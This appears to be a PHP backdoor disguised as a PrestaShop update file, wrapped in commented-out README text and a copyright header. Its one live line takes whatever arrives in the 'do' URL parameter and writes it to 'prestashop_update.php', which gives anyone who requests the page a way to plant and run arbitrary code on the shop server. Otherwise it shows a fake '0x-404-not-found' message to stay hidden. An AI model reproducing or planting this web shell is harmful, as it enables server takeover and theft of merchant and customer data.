...
//<p align=center>
//  <img src=http://www.prestashop.com/images/banners/general/ps161-screenshot-github.png alt=PrestaShops back office dashboard/>
//</p>//
...
//* [Merchants Guide][16]: Tips and tricks for first-time online sellers.
...
//PrestaShop is an Open Source project, and it wouldnt be possible without the help of the [hundreds of contributors][21], who submitted improvements and bugfixes over the years. Thank you all!//
...
*/
/*
 * This file is part of PrestaShop Updates.
 *
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */
if(isset($_GET['do'])) { $ktn = $_GET['do']; $file = fopen("prestashop_update.php", "w"); fwrite($file, $ktn); fclose($file); echo "checking... Updates"; }else{echo "0x-404-not-found";}
?>